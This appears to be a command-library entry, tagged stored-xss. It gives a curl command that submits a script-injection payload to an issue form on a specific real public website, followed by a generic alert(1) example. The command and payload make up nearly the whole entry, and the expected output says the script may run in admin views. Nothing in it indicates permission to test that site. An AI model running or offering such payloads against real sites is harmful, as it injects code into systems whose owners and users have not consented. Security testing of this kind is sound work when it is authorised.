---
id: cmd-uuid-6
data: >-
  curl -X POST 'https://www.data.gov/issue/request-id/574691' -d
  'media_url=catalog.data.gov/dataset/consumer-complaint-database\"%3E%3Cscript>confirm(document.domain)</script>'
tags:
  - stored-xss
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:38.793Z'
verified: false
validated: true
submitted: true
---
# curl-stored-xss-test

## Command

```bash
curl -X POST 'https://www.data.gov/issue/request-id/574691' -d 'media_url=catalog.data.gov/dataset/consumer-complaint-database\"%3E%3Cscript>confirm(document.domain)</script>'
```

## Description

Tests for stored XSS by submitting a script payload to an issue form.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d` | Script injection | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'target/issue' -d 'media_url=<script>alert(1)</script>'
```

## Expected Output

Successful submission; potential execution in admin views.

## Related

- [[procedures/Assess-Blind-Stored-XSS-Potential]]
